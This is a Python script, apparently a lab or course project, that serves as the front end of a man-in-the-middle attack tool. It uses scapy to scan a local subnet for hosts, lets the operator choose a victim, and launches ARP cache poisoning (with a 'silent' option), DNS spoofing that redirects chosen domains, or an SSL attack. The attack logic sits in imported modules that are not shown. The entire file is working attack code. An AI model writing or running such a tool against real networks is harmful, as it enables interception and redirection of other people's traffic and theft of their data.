import sys
from scapy.all import *
import arpForward
import dnsSpoofing
import httpResponse

def main():
    networkInterface = ""
    victimIP = []
    spoofIP = []
    urlList = {}
    devicesListOnNetwork = {}

    typeOfAttack = sys.argv[1]
    silentMode = None
    print("Start")
    while typeOfAttack != "arp" and typeOfAttack != "dns" and typeOfAttack != "ssl":
        typeOfAttack = input("Wrong mode of attack chose. Select arp/dns/ssl :")

    if typeOfAttack == "arp" :

        modeOfAttack = input("Do you want silent mode [y/n]:")
        while modeOfAttack != "y" and modeOfAttack != "n":
            modeOfAttack = input("Wrong input. Do you want silent mode [y/n]:")

        if modeOfAttack =="y":
            silentMode  = True
        if modeOfAttack == "n":
            silentMode  = False

    networkInterface = input("Enter network interface name (e.g. enp0s3) :")
    print("Scanning the network .. ")
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.56.0/24"),timeout = 2, iface=networkInterface, verbose = False)
    for arg1, arg2 in ans:
        devicesListOnNetwork.update ({arg2[ARP].psrc : arg2[ARP].hwsrc})
        print("IP: {} MAC: {}".format(arg2[ARP].psrc, arg2[ARP].hwsrc))

    inputCmd = ""

    while inputCmd not in devicesListOnNetwork.keys():
        inputCmd = input("Select victim IP from the network (e.f. 192.168.56.101): ")
        if inputCmd in devicesListOnNetwork.keys():
            victimIP.append(inputCmd)

    inputCmd = ""

    while inputCmd != "stop" and (typeOfAttack == "arp" or  typeOfAttack == "ssl") :
        if typeOfAttack == "arp":
            inputCmd = input("Select server (e.g. 192.168.56.102): ")
        if typeOfAttack == "ssl":
            inputCmd = input("Select server (e.g. 192.168.56.104): ")

        if inputCmd in devicesListOnNetwork.keys():
            spoofIP.append(inputCmd)
            inputCmd = input("Add more server IP or type stop, if you are done:")
        else :
            print("No IP on network")

    if typeOfAttack == "arp":
        arpAttack = arpForward.Arp(networkInterface, victimIP, spoofIP, silentMode)
        if silentMode:
            print("Silent ARP is started ...")
        else :
            print("ARP cache is being poissoned ...")
        arpAttack.start()

    if typeOfAttack == "dns":
        url = ""
        redirectTo = ""
        inputCmd = ""
        while url != "stop":
            url = input("Enter the URL to DNS spoof list or stop if you are done: ")
            while inputCmd != "stop" and url!="stop":
                inputCmd = input("Enter IP corresponded to " + url+ " domain:")
                if inputCmd in devicesListOnNetwork.keys():
                    spoofIP.append(inputCmd)
                    inputCmd = input("Add more server IP or type stop, if you are done:")
                else:
                    print("No IP on network")

            inputCmd = ""
            while redirectTo not in devicesListOnNetwork.keys():
                redirectTo = input("Enter sevrer IP where redirect request to (e.f. 192.168.56.102): ")

            url = url.upper()
            urlList.update({url + "": redirectTo})
            if url[0:4] != "WWW.":
                urlList.update({"WWW."+ url+"": redirectTo})
            else:
                urlList.update({url[4:]+"": redirectTo})
            url = url.lower()

        dnsAttack = dnsSpoofing.Dns(networkInterface, victimIP[0], spoofIP, urlList)
        dnsAttack.start()



    if typeOfAttack == "ssl":
        port = input("Enter port (e.g. 8050): ")
        sslAttack = httpResponse.Ssl(victimIP[0], port, networkInterface)
        sslAttack.start()



main()